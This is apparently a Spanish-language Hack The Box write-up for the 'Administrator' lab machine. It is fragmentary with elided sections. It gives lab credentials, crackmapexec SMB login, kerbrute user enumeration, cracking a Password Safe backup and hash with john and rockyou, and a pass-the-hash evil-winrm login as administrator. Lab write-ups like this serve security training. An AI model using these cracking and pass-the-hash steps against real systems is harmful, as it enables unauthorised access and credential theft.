---
layout: single
title: administartor - Hack The Box
excerpt: "Enumeración de servicios SMB Analizar recursos compartidos y obtener credenciales básicas.Acceso inicial Usar las credenciales obtenidas para ganar acceso inicial al sistema. Escalada de privilegios Explorar el sistema para conseguir privilegios administrativos, usualmente explotando malas configuraciones o credenciales débiles."

date: 2024-12-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-administrator/administrator-modified.png
...
![](/assets/images/htb-writeup-administrator/administrator-modified.png)
...
## contraseña del la maquina
 - Username: Olivia
 - Password: ichliebedich

use smbmap pero no me llevo a nada siempre recomiendo que usen diferentes aplicaciones porque a veces algunas no funcionan y otras si este seria el caso de `crackmapexec`
```
crackmapexec smb administrator.htb -u "Olivia" -p "ichliebedich"
```

![](/assets/images/htb-writeup-administrator/crack(1).png)

`./kerbrute_linux_amd64 userenum --dc 10.10.11.42 -d administrator.htb /usr/share/wordlists/amass/subdomains-top1mil-110000.txt`

con kerbrute enumeramos los usuarios en validos

 - Enumerar nombres de usuario válidos.
 - Realizar ataques de fuerza bruta a contraseñas.
 - Identificar configuraciones débiles en Kerberos.
...
tekieromucho
```
Backup.psafe3 encontramos esto que es muy interesante
...
```
![](/assets/images/htb-writeup-administrator/evil.png)
...
```
```
john contraseña.txt --wordlist=/usr/share/wordlists/rockyou.txt
limpbizkit       (?)
```
despudes de usar fuerza bruta me salio la contraña parece que es de Ethan
aun que aun es confuso
sguiremos buscando
...
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b4
...
ojito con el impacket

```
evil-winrm -i 10.10.11.42 -u administrator -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
```

![](/assets/images/htb-writeup-administrator/evilwin2(2).png)
